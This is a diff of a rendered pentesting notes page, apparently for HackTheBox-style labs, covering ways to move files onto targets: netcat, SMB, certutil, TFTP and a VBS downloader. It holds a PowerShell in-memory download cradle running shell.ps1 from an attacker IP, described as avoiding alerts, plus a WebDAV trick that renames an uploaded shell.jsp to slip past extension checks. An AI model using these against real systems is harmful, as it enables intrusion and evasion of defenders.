@@ -42,6 +42,8 @@
       
     
     
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
     <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
@@ -1267,21 +1269,22 @@
 <p>Try Harder™</p>
 <h2 id="hasing-and-verifying-files">Hasing and Verifying Files</h2>
 <p>Before you transfer a file, it's always best to know what it is you're actually transferring, mostly so you'll know if it gets corrupted during the transfer. But also becuse reading files in a terminal makes you feel like a proper hacker.</p>
-<pre><code class="language-bash"># Read a file
-cat /path/to/file
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #75715e"># Read a file</span>
+cat<span style="color: #f8f8f2"> </span>/path/to/file
 
-# Read the file headers
-xxd /path/to/file | head -c 1024
+<span style="color: #75715e"># Read the file headers</span>
+xxd<span style="color: #f8f8f2"> </span>/path/to/file<span style="color: #f8f8f2"> | </span>head<span style="color: #f8f8f2"> </span>-c<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">1024</span>
 
-# Have Linux guess at the file type (from the file header)
-file /path/to/file
+<span style="color: #75715e"># Have Linux guess at the file type (from the file header)</span>
+file<span style="color: #f8f8f2"> </span>/path/to/file
 
-# Get a SHA256 hash
-sha265sum /path/to/file
+<span style="color: #75715e"># Get a SHA256 hash</span>
+sha265sum<span style="color: #f8f8f2"> </span>/path/to/file
 
-# Get an MD5 hash
-md5sum /path/to/file
-</code></pre>
+<span style="color: #75715e"># Get an MD5 hash</span>
+md5sum<span style="color: #f8f8f2"> </span>/path/to/file
+</code></pre></div>
+
 <h2 id="one-file-many-files">One file &gt; Many files</h2>
 <p>If it's possible, archive whatever it is you need to upload/download.</p>
 <p>Sometimes it's not really feasible but it's something that should be considered, for multiple reasons.</p>
@@ -1291,208 +1294,233 @@ md5sum /path/to/file
 <li>One file is easier to transfer than 10</li>
 <li>You can serialize the contents of an archive for text based extraction if that's all you have</li>
 </ul>
-<pre><code class="language-bash"># Create a new tarball
-tar czvf NameOfTarBall.tgz /path/to/archive
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #75715e"># Create a new tarball</span>
+tar<span style="color: #f8f8f2"> </span>czvf<span style="color: #f8f8f2"> </span>NameOfTarBall.tgz<span style="color: #f8f8f2"> </span>/path/to/archive
 
-# Extract tarball
-tar xvf NameOfTarBall.tgz
+<span style="color: #75715e"># Extract tarball</span>
+tar<span style="color: #f8f8f2"> </span>xvf<span style="color: #f8f8f2"> </span>NameOfTarBall.tgz
 
-# Serialize a tarball
-cat NameOfTarBall.tgz | base64 -w 0
+<span style="color: #75715e"># Serialize a tarball</span>
+cat<span style="color: #f8f8f2"> </span>NameOfTarBall.tgz<span style="color: #f8f8f2"> | </span>base64<span style="color: #f8f8f2"> </span>-w<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span>
 
-# Recover tarball from serialized data
-echo &quot;&lt;BASE64_STRING&gt;&quot; | base64 -d &gt; recovered.tgz
-</code></pre>
+<span style="color: #75715e"># Recover tarball from serialized data</span>
+<span style="color: #f8f8f2">echo </span><span style="color: #e6db74">&quot;&lt;BASE64_STRING&gt;&quot;</span><span style="color: #f8f8f2"> | </span>base64<span style="color: #f8f8f2"> </span>-d<span style="color: #f8f8f2"> </span>&gt;<span style="color: #f8f8f2"> </span>recovered.tgz
+</code></pre></div>
+
 <h2 id="bash-command-line-tools">BASH (command line tools)</h2>
-<pre><code class="language-bash">wget &lt;path to file&gt; -O &lt;filename&gt;
-curl &lt;path to file&gt; --output &lt;filename&gt;
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>wget<span style="color: #f8f8f2"> </span>&lt;path<span style="color: #f8f8f2"> </span>to<span style="color: #f8f8f2"> </span>file&gt;<span style="color: #f8f8f2"> </span>-O<span style="color: #f8f8f2"> </span>&lt;filename&gt;
+curl<span style="color: #f8f8f2"> </span>&lt;path<span style="color: #f8f8f2"> </span>to<span style="color: #f8f8f2"> </span>file&gt;<span style="color: #f8f8f2"> </span>--output<span style="color: #f8f8f2"> </span>&lt;filename&gt;
 
-# Copy a file from a target to our host
-scp user@host:/path/to/file /path/to/destination
+<span style="color: #75715e"># Copy a file from a target to our host</span>
+scp<span style="color: #f8f8f2"> </span>user@host:/path/to/file<span style="color: #f8f8f2"> </span>/path/to/destination
 
-# Copy a file from our host to a target
-scp /path/to/file user@host:/path/to/destination
+<span style="color: #75715e"># Copy a file from our host to a target</span>
+scp<span style="color: #f8f8f2"> </span>/path/to/file<span style="color: #f8f8f2"> </span>user@host:/path/to/destination
 
-# Copy a whole directory from our host to a target
-scp -r /path/to/directory user@host:/path/to/destination
+<span style="color: #75715e"># Copy a whole directory from our host to a target</span>
+scp<span style="color: #f8f8f2"> </span>-r<span style="color: #f8f8f2"> </span>/path/to/directory<span style="color: #f8f8f2"> </span>user@host:/path/to/destination
+</code></pre></div>
 
-</code></pre>
 <p>We can use a netcat listener and STDOUT to write raw input to files:</p>
-<pre><code class="language-bash"># setup a listener where &quot;someFile&quot; is the file you want to write
-# this will sit and wait for the connection, so set it up first
-nc -lvnp 1337 &gt; someFile
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #75715e"># setup a listener where &quot;someFile&quot; is the file you want to write</span>
+<span style="color: #75715e"># this will sit and wait for the connection, so set it up first</span>
+nc<span style="color: #f8f8f2"> </span>-lvnp<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">1337</span><span style="color: #f8f8f2"> </span>&gt;<span style="color: #f8f8f2"> </span>someFile
 
-# On the target
-nc 10.10.14.4 1337 &lt; someFile
-</code></pre>
+<span style="color: #75715e"># On the target</span>
+nc<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">10</span>.10.14.4<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">1337</span><span style="color: #f8f8f2"> </span>&lt;<span style="color: #f8f8f2"> </span>someFile
+</code></pre></div>
+
 <p>You'll have no real way to tell when the transfer is done using the above <code>nc</code> method, so don't hit Ctrl-C until you're sure that everything copied across, and be sure to check the file size and run <code>file</code> and/or <code>sha256sum</code> to verify the integrity of the file (it can get trashed using this method)</p>
 <h2 id="ftp">FTP</h2>
 <h3 id="connect">Connect</h3>
-<pre><code class="language-bash">ftp domain.com
-ftp 192.168.0.1
-ftp user@ftpdomain.com
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>ftp<span style="color: #f8f8f2"> </span>domain.com
+ftp<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">192</span>.168.0.1
+ftp<span style="color: #f8f8f2"> </span>user@ftpdomain.com
+</code></pre></div>
+
 <h3 id="log-in">Log in</h3>
-<pre><code class="language-bash">Name: anonymous
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>Name:<span style="color: #f8f8f2"> </span>anonymous
 Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
+<span style="color: #ae81ff">230</span><span style="color: #f8f8f2"> </span>Login<span style="color: #f8f8f2"> </span>successful.
+Remote<span style="color: #f8f8f2"> </span>system<span style="color: #f8f8f2"> type </span>is<span style="color: #f8f8f2"> </span>UNIX.
+Using<span style="color: #f8f8f2"> </span>binary<span style="color: #f8f8f2"> </span>mode<span style="color: #f8f8f2"> </span>to<span style="color: #f8f8f2"> </span>transfer<span style="color: #f8f8f2"> </span>files.
 ftp&gt;
-</code></pre>
+</code></pre></div>
+
 <h3 id="move-around">Move around</h3>
-<pre><code class="language-bash">ftp&gt; ls
-ftp&gt; cd directory
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>ftp&gt;<span style="color: #f8f8f2"> </span>ls
+ftp&gt;<span style="color: #f8f8f2"> cd </span>directory
+</code></pre></div>
+
 <h3 id="grab-files">Grab files</h3>
-<pre><code class="language-bash">get file
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>get<span style="color: #f8f8f2"> </span>file
+</code></pre></div>
+
 <h3 id="send-files">Send files</h3>
-<pre><code class="language-bash">put file
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>put<span style="color: #f8f8f2"> </span>file
+</code></pre></div>
+
 <h2 id="python">Python</h2>
 <h3 id="with-requests">With Requests</h3>
 <p><code>pip install requests</code></p>
-<pre><code class="language-python">import requests
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #f92672">import</span> <span style="color: #f8f8f2">requests</span>
 
-url = 'https://www.python.org/static/img/python-logo@2x.png'
-myfile = requests.get(url)
-open('/path/to/save/image.png', 'wb').write(myfile.content)
-</code></pre>
+<span style="color: #f8f8f2">url</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;https://www.python.org/static/img/python-logo@2x.png&#39;</span>
+<span style="color: #f8f8f2">myfile</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">requests</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">get(url)</span>
+<span style="color: #f8f8f2">open(</span><span style="color: #e6db74">&#39;/path/to/save/image.png&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;wb&#39;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">write(myfile</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">content)</span>
+</code></pre></div>
+
 <h3 id="with-wget">With wget</h3>
 <p><code>pip install wget</code></p>
-<pre><code class="language-python">import wget
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #f92672">import</span> <span style="color: #f8f8f2">wget</span>
 
-url = &quot;https://www.python.org/static/img/python-logo@2x.png&quot;
-wget.download(url, '/path/to/save/image.png')
-</code></pre>
+<span style="color: #f8f8f2">url</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;https://www.python.org/static/img/python-logo@2x.png&quot;</span>
+<span style="color: #f8f8f2">wget</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">download(url,</span> <span style="color: #e6db74">&#39;/path/to/save/image.png&#39;</span><span style="color: #f8f8f2">)</span>
+</code></pre></div>
+
 <h3 id="with-urllib">With urllib</h3>
 <p><em>should already be installed, but...</em> <code>pip install urllib</code></p>
-<pre><code class="language-python">urllib.request.urlretrieve('url', 'path')
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #f8f8f2">urllib</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">request</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">urlretrieve(</span><span style="color: #e6db74">&#39;url&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;path&#39;</span><span style="color: #f8f8f2">)</span>
+</code></pre></div>
+
 <p>With urllib3</p>
 <p><code>pip install urllib3</code></p>
-<pre><code class="language-python">import urllib3, shutil
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #f92672">import</span> <span style="color: #f8f8f2">urllib3</span><span style="color: #f92672">,</span> <span style="color: #f8f8f2">shutil</span>
 
-url = 'https://www.python.org/'
-c = urllib3.PoolManager()
-filename = &quot;test.txt&quot;
-with c.request('GET', url, preload_content=False) as res, open(filename, 'wb') as out_file:
-    shutil.copyfileobj(res, out_file)
-</code></pre>
+<span style="color: #f8f8f2">url</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;https://www.python.org/&#39;</span>
+<span style="color: #f8f8f2">c</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">urllib3</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">PoolManager()</span>
+<span style="color: #f8f8f2">filename</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;test.txt&quot;</span>
+<span style="color: #66d9ef">with</span> <span style="color: #f8f8f2">c</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">request(</span><span style="color: #e6db74">&#39;GET&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">url,</span> <span style="color: #f8f8f2">preload_content</span><span style="color: #f92672">=</span><span style="color: #66d9ef">False</span><span style="color: #f8f8f2">)</span> <span style="color: #66d9ef">as</span> <span style="color: #f8f8f2">res,</span> <span style="color: #f8f8f2">open(filename,</span> <span style="color: #e6db74">&#39;wb&#39;</span><span style="color: #f8f8f2">)</span> <span style="color: #66d9ef">as</span> <span style="color: #f8f8f2">out_file:</span>
+    <span style="color: #f8f8f2">shutil</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">copyfileobj(res,</span> <span style="color: #f8f8f2">out_file)</span>
+</code></pre></div>
+
 <h2 id="powershell">Powershell</h2>
 <p>In-memory download cradle <em>handy for pentesting as nothing gets written to disk so there is less chance of triggering a related alert</em></p>
-<pre><code class="language-bash">IEX(New-Object Net.WebClient)downloadString('http://10.10.14.4/shell.ps1')
-</code></pre>
-<h3 id="standard-web-request">Standard Web Request</h3>
-<pre><code class="language-bash">iwr ‘http://10.10.14.4/shell.ps1’ -Outfile C:\Windows\temp\shell.ps1
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>IEX<span style="color: #f92672">(</span>New-Object<span style="color: #f8f8f2"> </span>Net.WebClient<span style="color: #f92672">)</span>downloadString<span style="color: #f92672">(</span><span style="color: #e6db74">&#39;http://10.10.14.4/shell.ps1&#39;</span><span style="color: #f92672">)</span>
+</code></pre></div>
 
-Invoke-WebRequest -Url http://10.10.14.4/shell.ps1 -Outfile C:\Windows\temp\shell.ps1
-</code></pre>
+<h3 id="standard-web-request">Standard Web Request</h3>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>iwr<span style="color: #f8f8f2"> </span>‘http://10.10.14.4/shell.ps1’<span style="color: #f8f8f2"> </span>-Outfile<span style="color: #f8f8f2"> </span>C:<span style="color: #ae81ff">\W</span>indows<span style="color: #ae81ff">\t</span>emp<span style="color: #ae81ff">\s</span>hell.ps1
+
+Invoke-WebRequest<span style="color: #f8f8f2"> </span>-Url<span style="color: #f8f8f2"> </span>http://10.10.14.4/shell.ps1<span style="color: #f8f8f2"> </span>-Outfile<span style="color: #f8f8f2"> </span>C:<span style="color: #ae81ff">\W</span>indows<span style="color: #ae81ff">\t</span>emp<span style="color: #ae81ff">\s</span>hell.ps1
+</code></pre></div>
+
 <h2 id="smb">SMB</h2>
 <h3 id="standard-smb">Standard SMB</h3>
 <ol>
 <li>Modify /etc/samba/smbd.conf. Add the following to the bottom:</li>
 </ol>
-<pre><code class="language-bash">[global]
-workgroup = WORKGROUP
-server string = Samba Server %v
-netbios name = tengu
-security = user
-map to guest = bad user
-name resolve order = bcast host
-dns proxy = no
-bind interfaces only = yes
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #f92672">[</span>global<span style="color: #f92672">]</span>
+<span style="color: #f8f8f2">workgroup </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>WORKGROUP
+server<span style="color: #f8f8f2"> string </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>Samba<span style="color: #f8f8f2"> </span>Server<span style="color: #f8f8f2"> </span>%v
+netbios<span style="color: #f8f8f2"> name </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>tengu
+<span style="color: #f8f8f2">security </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>user
+map<span style="color: #f8f8f2"> </span>to<span style="color: #f8f8f2"> guest </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>bad<span style="color: #f8f8f2"> </span>user
+name<span style="color: #f8f8f2"> </span>resolve<span style="color: #f8f8f2"> order </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>bcast<span style="color: #f8f8f2"> </span>host
+dns<span style="color: #f8f8f2"> proxy </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>no
+<span style="color: #f8f8f2">bind </span>interfaces<span style="color: #f8f8f2"> only </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>yes
 
-[gorilla]
-path = /var/www/html/pub
-writable = no
-guest ok = yes
-guest only = yes
-read only = yes
-directory mode = 0555
-force user = nobody
-</code></pre>
+<span style="color: #f92672">[</span>gorilla<span style="color: #f92672">]</span>
+<span style="color: #f8f8f2">path </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>/var/www/html/pub
+<span style="color: #f8f8f2">writable </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>no
+guest<span style="color: #f8f8f2"> ok </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>yes
+guest<span style="color: #f8f8f2"> only </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>yes
+<span style="color: #f8f8f2">read only </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>yes
+directory<span style="color: #f8f8f2"> mode </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0555</span>
+force<span style="color: #f8f8f2"> user </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>nobody
+</code></pre></div>
+
 <h3 id="set-folder-permissions">Set folder permissions</h3>
-<pre><code class="language-bash">chmod 0555 /var/www/html/pub
-chown -R nobody:nogroup /var/www/html/pub
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>chmod<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0555</span><span style="color: #f8f8f2"> </span>/var/www/html/pub
+chown<span style="color: #f8f8f2"> </span>-R<span style="color: #f8f8f2"> </span>nobody:nogroup<span style="color: #f8f8f2"> </span>/var/www/html/pub
+</code></pre></div>
 
-</code></pre>
 <h3 id="restart-samba">Restart Samba</h3>
-<pre><code class="language-bash">service smbd start
-service smdb stop
-service smbd restart
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>service<span style="color: #f8f8f2"> </span>smbd<span style="color: #f8f8f2"> </span>start
+service<span style="color: #f8f8f2"> </span>smdb<span style="color: #f8f8f2"> </span>stop
+service<span style="color: #f8f8f2"> </span>smbd<span style="color: #f8f8f2"> </span>restart
+</code></pre></div>
 
-</code></pre>
 <h3 id="monitor-logs-for-errors">Monitor logs for errors</h3>
-<pre><code class="language-bash">tail -f /var/log/samba/log.&lt;site-name&gt;
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>tail<span style="color: #f8f8f2"> </span>-f<span style="color: #f8f8f2"> </span>/var/log/samba/log.&lt;site-name&gt;
+</code></pre></div>
+
 <h2 id="impacket-smb">Impacket SMB</h2>
-<pre><code class="language-bash">impacket-smbserver -ip 10.10.14.4 -smb2support bullsec /var/www/html/pub
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>impacket-smbserver<span style="color: #f8f8f2"> </span>-ip<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">10</span>.10.14.4<span style="color: #f8f8f2"> </span>-smb2support<span style="color: #f8f8f2"> </span>bullsec<span style="color: #f8f8f2"> </span>/var/www/html/pub
+</code></pre></div>
+
 <p>Then use <code>\\10.10.14.4\bullsec\&lt;file-name&gt;</code> as the location to send your file from, or to have the target grab from you.</p>
 <p>Mounting a remote share is pretty simple as well assuming you know the name of the share:</p>
-<pre><code class="language-bash">mkdir /mnt/10.10.10.123
-mount -t cifs //10.10.10.123/general /mnt/10.10.10.123
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>mkdir<span style="color: #f8f8f2"> </span>/mnt/10.10.10.123
+mount<span style="color: #f8f8f2"> </span>-t<span style="color: #f8f8f2"> </span>cifs<span style="color: #f8f8f2"> </span>//10.10.10.123/general<span style="color: #f8f8f2"> </span>/mnt/10.10.10.123
+</code></pre></div>
 
-</code></pre>
 <p>Now we can browse the share inside our terminal.</p>
 <h3 id="impacket-smb-w-password">Impacket SMB w/ Password</h3>
-<pre><code class="language-bash"># Create the SMB Share
-impacket-smbserver bullShare $(pwd) -smb2support -user bullsec -password SecurePassword
-</code></pre>
-<pre><code class="language-powershell"># Create a Credential Object
-$pass = convertto-securestring 'SecurePassword' -asplain -force
-$cred = new-object system.management.automation.pscredential(&quot;htb\bullsec&quot;, $pass)
-</code></pre>
-<pre><code class="language-powershell"># Connect to the Share
-New-PSDrive -Name bullsec -PSProvider FileSystem -Credential $cred -Root \\10.10.14.3\bullShare
-</code></pre>
-<pre><code class="language-powershell"># Browse the Share
-cd bullShare:
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #75715e"># Create the SMB Share</span>
+impacket-smbserver<span style="color: #f8f8f2"> </span>bullShare<span style="color: #f8f8f2"> </span><span style="color: #66d9ef">$(</span><span style="color: #f8f8f2">pwd</span><span style="color: #66d9ef">)</span><span style="color: #f8f8f2"> </span>-smb2support<span style="color: #f8f8f2"> </span>-user<span style="color: #f8f8f2"> </span>bullsec<span style="color: #f8f8f2"> </span>-password<span style="color: #f8f8f2"> </span>SecurePassword
+</code></pre></div>
+
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #75715e"># Create a Credential Object</span>
+<span style="color: #f8f8f2">$pass</span> <span style="color: #f8f8f2">=</span> <span style="color: #f8f8f2">convertto-securestring</span> <span style="color: #e6db74">&#39;SecurePassword&#39;</span> <span style="color: #f8f8f2">-asplain</span> <span style="color: #f8f8f2">-force</span>
+<span style="color: #f8f8f2">$cred</span> <span style="color: #f8f8f2">=</span> <span style="color: #f8f8f2">new-object</span> <span style="color: #f8f8f2">system.management.automation.pscredential(</span><span style="color: #e6db74">&quot;htb\bullsec&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$pass)</span>
+</code></pre></div>
+
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #75715e"># Connect to the Share</span>
+<span style="color: #f8f8f2">New-PSDrive</span> <span style="color: #f8f8f2">-Name</span> <span style="color: #f8f8f2">bullsec</span> <span style="color: #f8f8f2">-PSProvider</span> <span style="color: #f8f8f2">FileSystem</span> <span style="color: #f8f8f2">-Credential</span> <span style="color: #f8f8f2">$cred</span> <span style="color: #f8f8f2">-Root</span> <span style="color: #f8f8f2">\\10.10.14.3\bullShare</span>
+</code></pre></div>
+
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #75715e"># Browse the Share</span>
+<span style="color: #f8f8f2">cd bullShare:</span>
+</code></pre></div>
+
 <h2 id="certutil">certutil</h2>
 <p>Genuinely forget that this is a thing most of the time but it's such a useful tool. If you're on a Windows machine then this may be a viable option for transferring files from our host system to the target:</p>
-<pre><code class="language-bash">certutil -urlcache -f “http://10.10.14.14/shell.exe” shell.exe
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>certutil<span style="color: #f8f8f2"> </span>-urlcache<span style="color: #f8f8f2"> </span>-f<span style="color: #f8f8f2"> </span>“http://10.10.14.14/shell.exe”<span style="color: #f8f8f2"> </span>shell.exe
+</code></pre></div>
+
 <p>That's it really.</p>
 <p>It might not always be a thing, but on older Windows machines it should be present.</p>
 <h2 id="tftp">TFTP</h2>
 <p>Trivial File Transfer Protocol is a nice way to get around file transfers on Windows assuming it's installed on the sytem. It's basically FTP but it runs on UDP instead of TCP.</p>
-<pre><code class="language-bash">service atftpd start
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>service<span style="color: #f8f8f2"> </span>atftpd<span style="color: #f8f8f2"> </span>start
+</code></pre></div>
+
 <p>On Kali by default TFTP is configured from the following location:</p>
 <p><code>/etc/default/atftpd</code></p>
 <p>And it serves files (by default) from:</p>
 <p><code>/srv/tftp</code></p>
 <p>To download files from a server we can do:</p>
-<pre><code class="language-bash">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>tftp<span style="color: #f8f8f2"> </span>-i<span style="color: #f8f8f2"> </span>host<span style="color: #f8f8f2"> </span>GET<span style="color: #f8f8f2"> </span>C:%homepath%file<span style="color: #f8f8f2"> </span>location_of_file_on_tftp_server
+</code></pre></div>
+
 <p>And to upload a file to the server we can do:</p>
-<pre><code class="language-bash">tftp -i host PUT C:%homepath%file location_of_file_on_tftp_server
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>tftp<span style="color: #f8f8f2"> </span>-i<span style="color: #f8f8f2"> </span>host<span style="color: #f8f8f2"> </span>PUT<span style="color: #f8f8f2"> </span>C:%homepath%file<span style="color: #f8f8f2"> </span>location_of_file_on_tftp_server
+</code></pre></div>
+
 <h2 id="sftp">SFTP</h2>
 <p><a href="https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server">How To Use SFTP to Securely Transfer Files with a Remote Server</a></p>
 <h2 id="visualbasic">VisualBasic</h2>
 <p>If push comes to shove, we can use something like the following:</p>
-<pre><code class="language-bash">Set args = Wscript.Arguments 
-Url = &quot;http://domain/file&quot; dim xHttp: 
-Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;) dim bStrm: 
-Set bStrm = createobject(&quot;Adodb.Stream&quot;) 
-xHttp.Open &quot;GET&quot;, Url, False xHttp.Send with bStrm     
-.type = 1 '     
-.open     
-.write xHttp.responseBody     
-.savetofile &quot; C:%homepath%file&quot;, 2 ' end with
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>Set<span style="color: #f8f8f2"> args </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>Wscript.Arguments<span style="color: #f8f8f2"> </span>
+<span style="color: #f8f8f2">Url </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span><span style="color: #e6db74">&quot;http://domain/file&quot;</span><span style="color: #f8f8f2"> </span>dim<span style="color: #f8f8f2"> </span>xHttp:<span style="color: #f8f8f2"> </span>
+Set<span style="color: #f8f8f2"> xHttp </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>createobject<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;Microsoft.XMLHTTP&quot;</span><span style="color: #f92672">)</span><span style="color: #f8f8f2"> </span>dim<span style="color: #f8f8f2"> </span>bStrm:<span style="color: #f8f8f2"> </span>
+Set<span style="color: #f8f8f2"> bStrm </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span>createobject<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;Adodb.Stream&quot;</span><span style="color: #f92672">)</span><span style="color: #f8f8f2"> </span>
+xHttp.Open<span style="color: #f8f8f2"> </span><span style="color: #e6db74">&quot;GET&quot;</span>,<span style="color: #f8f8f2"> </span>Url,<span style="color: #f8f8f2"> </span>False<span style="color: #f8f8f2"> </span>xHttp.Send<span style="color: #f8f8f2"> </span>with<span style="color: #f8f8f2"> </span>bStrm<span style="color: #f8f8f2">     </span>
+.type<span style="color: #f8f8f2"> </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2"> </span><span style="color: #e6db74">&#39;     </span>
+<span style="color: #e6db74">.open     </span>
+<span style="color: #e6db74">.write xHttp.responseBody     </span>
+<span style="color: #e6db74">.savetofile &quot; C:%homepath%file&quot;, 2 &#39;</span><span style="color: #f8f8f2"> </span>end<span style="color: #f8f8f2"> </span>with
+</code></pre></div>
+
 <h2 id="webdav">WebDAV</h2>
 <p>We can sometimes use WebDAV to upload files to a system.</p>
 <p>If it's enabled use a tool like cadaver to PUT a file onto the server, usually there are some restrictions on file uploads/execution, bu it doesn't recheck the file after the initial upload, so just use the mv command to change the extension.</p>
-<pre><code class="language-bash">$&gt; cadaver http://192.168.56.5
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>$&gt;<span style="color: #f8f8f2"> </span>cadaver<span style="color: #f8f8f2"> </span>http://192.168.56.5
 
-put shell.jsp.txt
-mv shell.jsp.txt shell.jsp
-</code></pre>
+put<span style="color: #f8f8f2"> </span>shell.jsp.txt
+mv<span style="color: #f8f8f2"> </span>shell.jsp.txt<span style="color: #f8f8f2"> </span>shell.jsp
+</code></pre></div>
 
 
 
